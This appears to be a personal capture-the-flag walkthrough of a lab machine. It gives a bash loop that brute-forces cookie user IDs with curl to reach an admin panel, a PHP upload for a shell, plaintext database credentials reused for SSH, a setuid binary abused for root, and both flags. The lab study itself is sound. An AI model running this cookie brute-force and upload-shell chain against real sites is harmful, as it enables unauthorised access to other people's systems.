public:: true
tags:: idor, rfi, setuid

- Virtual Host: `megacorp.com`
- Web browser cookie can be IDORed to escalate to the `admin` user within the website
	- Lets try to brute-force the `user` ID in the cookie via IDOR.
	  *Print successful IDs and every 100 attempts (to watch it progressing)*
	  ```bash
	  > for i in {10000..99999}; do
	  	if ! (($i % 100)); then
	      	echo "$i"
	      fi
	      if ! curl 2>/dev/null -L 'http://megacorp.com/cdn-cgi/login/admin.php?content=uploads' \
	                            -H "Cookie: user=$i; role=admin" | \
	                            grep >/dev/null "Log in"; then
	      	echo "$i <- Admin"
	      fi
	  done
	  
	  [...]
	  34300
	  34322 <- Admin
	  34400
	  [...]
	  ```
- **User flag** at `/home/robert/user.txt`
	- f2c74ee8db7983851ab2a96a44eb7981
	  background-color:: green
- From the admin panel we can upload a php file (RFI) and get a shell as the user `www-data`.
- Looking at the `db.php` file we can retrieve the username and password to access the mysql db
	- ```php
	  $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
	  ```
	  #+BEGIN_CAUTION
	  `robert:M3g4C0rpUs3r!`
	  #+END_CAUTION
- #+BEGIN_TIP
  The user `robert` reuses the same password of his OS user.
  #+END_TIP
	- Since SSH is accessible lets use it to get a shell as user `robert`.
	  We successfully escalated from `www-data` to `robert`.
	- `robert` is part of the `bugtracker` group
		- We found a setuid binary which belong to such a group
		  ```bash
		  -rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
		  ```
			- It's a buggy binary and let us execute whatever command we want.
- **Root flag** at `/root/root.txt`
	- af13b0bee69f8a877c3faf667f7beacf
	  background-color:: green